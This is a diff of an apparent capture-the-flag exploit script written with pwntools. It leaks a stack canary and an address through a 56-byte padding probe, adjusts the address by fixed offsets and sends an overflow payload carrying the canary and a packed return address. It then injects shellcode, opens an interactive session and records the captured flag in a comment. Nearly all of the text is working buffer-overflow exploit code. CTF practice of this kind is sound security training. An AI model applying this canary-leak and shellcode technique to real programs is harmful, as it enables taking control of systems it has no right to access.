@@ -51,15 +51,22 @@ hex_out = ''.join(f"{byte:02x}" for byte in out1)
 print("can: ", hex_out)
 hex_out = ''.join(f"{byte:02x}" for byte in out2)
 print("add: ", hex_out)
-out = out2
-out = out.ljust(8, b'\x00')
 
+
+r.recvuntil(b"number? ")
+payload = 'A' * 56
+r.send(payload)
+out = r.recvline().strip()
+padding = b'A' * 56
+split_position = out.find(padding) + len(padding)
+out = out[split_position:]  
+
+out = out.ljust(8, b'\x00')
 address = unpack(out, 'all', endian='little')
 print(f'Out: {out}\tAddress: {address:#018x}')
-address -= 0x96
+address -= 0xa0
 address -= 0x8a67
 address += 0xd31e0
-address -= 0x80CF269
 
 print(f"new_address: {address:#018x}")
 import struct
@@ -67,10 +74,9 @@ padding = b"A" * 40
 
 packed_address = struct.pack("<Q", address)
 
-payload = padding + out1 + b"AAAAAAAA" + packed_address
+payload = padding + out1 + b"A"*8 + packed_address
 print(payload)
-r.recvuntil(b"number? ")
-r.sendline(payload)
+
 r.recvuntil(b"name? ")
 r.sendline(payload)
 payload = asm(shellcode)
@@ -81,3 +87,5 @@ r.interactive()
 
 # vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
 #aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+#FLAG{SIMPlY_BUFF3R_0V3RFL0W_w/C@N@RY!!}
